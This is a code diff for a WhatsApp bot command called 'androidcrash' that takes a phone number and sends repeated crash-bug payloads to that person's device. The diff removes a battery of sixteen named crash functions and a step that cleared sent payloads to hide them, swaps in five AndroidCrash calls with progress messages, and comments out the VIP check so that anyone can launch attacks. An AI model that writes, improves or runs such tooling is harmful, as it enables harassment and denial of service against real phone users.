@@ -5,7 +5,7 @@ export default {
   name: "androidcrash",
   commands: ["androidcrash", "acrash"],
   category: "bugmenu",
-  description: "Send Android + Crash bugs",
+  description: "Send Android Crash bugs",
   usage: ".androidcrash <phone number>",
   adminOnly: false,
   
@@ -13,19 +13,19 @@ export default {
     try {
       const userTelegramId = VIPHelper.fromSessionId(sessionId)
       if (!userTelegramId) {
-        await sock.sendMessage(m.chat, { text: "❌ Session error\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+        await sock.sendMessage(m.chat, { text: "❌ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐞𝐫𝐫𝐨𝐫\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
         return
       }
 
       const vipStatus = await VIPQueries.isVIP(userTelegramId)
-      if (!vipStatus.isVIP) {
-        await sock.sendMessage(m.chat, { text: "❌ VIP access required\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
-        return
-      }
+     // if (!vipStatus.isVIP) {
+       // await sock.sendMessage(m.chat, { text: "❌ 𝐕𝐈𝐏 𝐚𝐜𝐜𝐞𝐬𝐬 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+       // return
+    //  }
 
       if (!args || args.length === 0) {
         await sock.sendMessage(m.chat, { 
-          text: "❌ Usage: .androidcrash <phone number>\nExample: .androidcrash 234 806 7023422\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
+          text: "❌ 𝐔𝐬𝐚𝐠𝐞: .androidcrash <phone number>\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: .androidcrash 123 456 7890\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙"
         }, { quoted: m })
         return
       }
@@ -33,106 +33,75 @@ export default {
       let phoneNumber = args.join('').replace(/[^0-9]/g, '')
       
       if (!phoneNumber) {
-        await sock.sendMessage(m.chat, { text: "❌ Invalid phone number\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+        await sock.sendMessage(m.chat, { text: "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
         return
       }
 
       const target = `${phoneNumber}@s.whatsapp.net`
       
       if (target === m.sender) {
-        await sock.sendMessage(m.chat, { text: "❌ Cannot attack yourself\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+        await sock.sendMessage(m.chat, { text: "❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐲𝐨𝐮𝐫𝐬𝐞𝐥𝐟\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
         return
       }
 
-      // Check if target is a VIP user by looking up their phone number in the database
       const targetUser = await VIPQueries.getUserByPhone(phoneNumber)
       if (targetUser && targetUser.telegram_id) {
         const targetVipStatus = await VIPQueries.isVIP(targetUser.telegram_id)
         if (targetVipStatus.isVIP) {
-          await sock.sendMessage(m.chat, { text: "❌ Cannot attack VIP users\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+          await sock.sendMessage(m.chat, { text: "❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐕𝐈𝐏 𝐮𝐬𝐞𝐫𝐬\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
           return
         }
       }
 
-      // Import bug functions only when needed
-      const {
-        delaycrash, delayBlonde, DefJam, HardInvis, XProtexDelayCrash, LocationDelay,
-        BlankVisco, bulldoserV3, PhotoDelay, protocolbug6, VerloadXDelayBlank,
-        VerloadHardCore, noise, crashinvis, newImage2, StickerPackFreeze
-      } = await import("../../lib/buggers/bug.js")
-
-      let progressMsg = await sock.sendMessage(m.chat, { 
-        text: `🤖💥 *ANDROID+CRASH ATTACK*\n\n🎯 Target: +${phoneNumber}\n💣 Initializing...` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
+      let statusMsg = await sock.sendMessage(m.chat, { 
+        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n🔍 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐭𝐚𝐫𝐠𝐞𝐭...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`
       }, { quoted: m })
 
-      let progress = `🤖💥 *ANDROID+CRASH ATTACK*\n\n🎯 Target: +${phoneNumber}\n\n📊 *Progress:*\n\n`
+      await sock.sendMessage(m.chat, {
+        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* +${phoneNumber}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐂𝐫𝐚𝐬𝐡\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* 𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠...\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠 𝐚𝐭𝐭𝐚𝐜𝐤...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+        edit: statusMsg.key
+      })
 
-      const bugs = [
-          { name: 'CrashInvis', fn: crashinvis, count: 5 },
-          { name: 'Delaycrash', fn: delaycrash, count: 2 },
-        { name: 'StickerPackFreeze', fn: StickerPackFreeze, count: 2 },
-        
-        { name: 'DelayBlonde', fn: delayBlonde, count: 2 },
-        { name: 'DefJam', fn: DefJam, count: 2 },
-        { name: 'LocationDelay', fn: LocationDelay, count: 2 },
-        { name: 'HardInvis', fn: HardInvis, count: 1 },
-        { name: 'XProtexDelay', fn: XProtexDelayCrash, count: 5 },
-        { name: 'BlankVisco', fn: BlankVisco, count: 5 },
-        { name: 'BulldoserV3', fn: bulldoserV3, count: 5 },
-        { name: 'PhotoDelay', fn: PhotoDelay, count: 5 },
-        { name: 'Protocol6', fn: protocolbug6, count: 5 },
-        { name: 'VerloadDelay', fn: VerloadXDelayBlank, count: 5 },
-        { name: 'VerloadHardCore', fn: VerloadHardCore, count: 5 },
-        { name: 'Noise', fn: noise, count: 5 },
-        
-        { name: 'NewImage2', fn: newImage2, count: 5 }
+      const { AndroidCrash } = await import("../../lib/buggers/bug.js")
+
+      const totalBugs = 5
+      const progressSteps = [
+        { percent: 20, bar: "《 ██▒▒▒▒▒▒▒▒▒▒》20%" },
+        { percent: 40, bar: "《 █████▒▒▒▒▒▒▒》40%" },
+        { percent: 60, bar: "《 ████████▒▒▒▒》60%" },
+        { percent: 80, bar: "《 ██████████▒▒》80%" },
+        { percent: 100, bar: "《 ████████████》100%" }
       ]
-      
-      let totalWaves = 0
 
-      for (const bug of bugs) {
-        progress += `🔄 ${bug.name}: `
-        for (let i = 0; i < bug.count; i++) {
-          const sentMsg = await bug.fn(sock, target)
+      for (let i = 0; i < totalBugs; i++) {
+        try {
+          await AndroidCrash(sock, target)
           
-          if (sentMsg && sentMsg.key) {
-            try {
-              await sock.chatModify(
-                { 
-                  clear: { 
-                    messages: [{ id: sentMsg.key.id, fromMe: true }] 
-                  } 
-                }, 
-                target
-              )
-            } catch (error) {
-              // Silent fail
-            }
-          }
+          const currentPercent = Math.floor(((i + 1) / totalBugs) * 100)
+          const currentStep = progressSteps.find(step => step.percent >= currentPercent) || progressSteps[progressSteps.length - 1]
           
-          progress += `✓ `
-          totalWaves++
-          await new Promise(resolve => setTimeout(resolve, 2000))
+          await sock.sendMessage(m.chat, {
+            text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* +${phoneNumber}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐂𝐫𝐚𝐬𝐡\n> *𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬:* ${currentStep.bar}\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠 𝐩𝐚𝐲𝐥𝐨𝐚𝐝...\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+            edit: statusMsg.key
+          })
+          
+          await new Promise(resolve => setTimeout(resolve, 500))
+        } catch (bugError) {
+          console.error("[AndroidCrash] Bug error:", bugError)
         }
-        progress += `(${bug.count}/${bug.count})\n`
-        
-        await sock.sendMessage(m.chat, { 
-          text: progress,
-          edit: progressMsg.key
-        })
       }
 
-      progress += `\n✅ Successfully sent bug to +${phoneNumber}\n📦 Total: ${totalWaves} waves`
-
-      await sock.sendMessage(m.chat, { 
-        text: progress,
-        edit: progressMsg.key
+      await sock.sendMessage(m.chat, {
+        text: `🌪️ 𝐌𝐚𝐭𝐫𝐢𝐱 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦 𖣂\n\n> *𝐓𝐚𝐫𝐠𝐞𝐭:* +${phoneNumber}\n> *𝐁𝐮𝐠 𝐓𝐲𝐩𝐞:* 𝐀𝐧𝐝𝐫𝐨𝐢𝐝 𝐂𝐫𝐚𝐬𝐡\n> *𝐒𝐭𝐚𝐭𝐮𝐬:* ✅\n\n\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\n🥑 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐬𝐞𝐧𝐭 𝐭𝐨 𝐭𝐚𝐫𝐠𝐞𝐭\n\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙`,
+        edit: statusMsg.key
       })
 
       return { success: true }
     } catch (error) {
       console.error("[AndroidCrash] Error:", error)
-      await sock.sendMessage(m.chat, { text: "❌ Attack failed: " + error.message + "\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" }, { quoted: m })
+      await sock.sendMessage(m.chat, { 
+        text: `❌ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐟𝐚𝐢𝐥𝐞𝐝: ${error.message}\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
+      }, { quoted: m })
       return { success: false }
     }
   }
